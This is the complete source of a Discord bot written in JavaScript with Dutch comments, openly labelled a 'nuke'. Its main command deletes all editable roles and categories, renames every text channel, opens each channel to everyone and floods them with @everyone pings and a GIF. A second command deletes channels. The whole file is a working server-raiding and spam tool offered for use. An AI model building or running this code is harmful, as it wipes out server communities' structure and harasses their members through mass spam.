import { Client, GatewayIntentBits, PermissionsBitField, ChannelType } from 'discord.js';
import http from 'http';

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const PREFIX = '.1';
const GIF_URL = "https://cdn.discordapp.com/attachments/1522698849276268634/1522701428466909326/togif.gif";

http.createServer((req, res) => res.end('Bot running!')).listen(3000);

client.once('ready', () => {
    console.log(`✅ Bot is online als ${client.user.tag}`);
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift()?.toLowerCase();
    const spamAmount = parseInt(args[0]) || 4; // minder spam voor snelheid

    if (command === 'all') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply("❌ Administrator rechten nodig!");
        }

        try {
            await message.author.send("⚠️ **SNELLE NUKE** ⚠️\nAlles wordt nu snel aangepast.");
        } catch {}

        let cancelled = false;
        const collector = message.channel.createMessageCollector({
            filter: m => m.author.id === message.author.id && m.content.toLowerCase() === '.1cancel',
            time: 3000
        });
        collector.on('collect', () => cancelled = true);

        await new Promise(r => setTimeout(r, 3000));
        if (cancelled) return;

        // 1. Rollen snel verwijderen
        await message.reply("🗑️ Rollen verwijderen...");
        for (const role of message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).values()) {
            try { await role.delete(); } catch {} // minimale delay
        }

        // 2. Categorieën verwijderen
        await message.channel.send("🗑️ Categorieën verwijderen...");
        for (const category of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildCategory).values()) {
            try { await category.delete(); } catch {}
        }

        // 3. Channels snel aanpassen + spammen
        await message.channel.send("🚀 Channels hernoemen + spammen...");

        let processed = 0;
        for (const channel of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).values()) {
            try {
                await channel.setName("Finnson the goat");

                // Iedereen zichtbaarheid
                await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                    ViewChannel: true,
                    SendMessages: true,
                    ReadMessageHistory: true
                }).catch(() => {});

                // Snelle spam
                for (let i = 0; i < spamAmount; i++) {
                    await channel.send(`@everyone\n${GIF_URL}`).catch(() => {});
                }

                processed++;
            } catch (err) {}
        }

        await message.channel.send(`✅ Klaar! **${processed}** channels aangepast.`);
        return;
    }

    // Normale delete
    let target = args.length > 0 ? message.mentions.channels.first() : message.channel;
    if (target) {
        try {
            await target.delete();
            message.reply(`🗑️ **${target.name}** verwijderd.`).catch(() => {});
        } catch {}
    }
});

client.login(process.env.TOKEN);
